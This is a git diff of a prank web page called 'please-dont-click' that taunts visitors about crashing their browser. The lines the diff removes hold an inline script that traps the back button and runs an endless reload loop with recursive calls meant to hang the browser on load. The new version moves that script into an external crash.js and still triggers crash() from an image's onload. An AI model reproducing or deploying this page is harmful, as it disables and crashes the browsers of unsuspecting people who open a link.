@@ -4,32 +4,33 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>asdf</title>
-    <script>
-        console.log('script loaded')
-        // disable back button
-        history.pushState(null, document.title, location.href);
-        window.addEventListener('popstate', function() {
-            history.pushState(null, document.title, location.href);
-        });
-
-        function crash() {
-            // should hang chromium-based browsers
-            while (1) location.reload(1);
-            // forkbomb
-            crash();
-            crash();
+    <title>please-dont-click</title>
+    <style>
+        html, body {
+            color-scheme: light dark;
+            font: 16px 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
         }
 
-        // fallback for image not loading
-        window.onload = () => setTimeout(crash, 100);
-    </script>
+        img {
+            width: 600px;
+            max-width: 100%;
+        }
+
+        noscript {
+            display: block;
+            margin-bottom: 1em;
+        }
+    </style>
 </head>
 <body>
     <p>Let this be a lesson to never trust anyone.</p>
     <p>You never know what you are getting into.</p>
-    <p>And, in this case, I was so nice as to crash your browser.</p>
+    <p>And in this case, I was so nice as to crash your browser.</p>
+    <noscript>
+        <b>Nevermind, it looks like you have disabled Javascript. That was smart of you.</b>
+    </noscript>
     <img src="rick.jpg" alt="Say Goodbye To Your Computer" onload="crash()">
     <p>Courtesy of Ebula the Duck and your new enemy</p>
+    <script src="crash.js"></script>
 </body>
 </html>
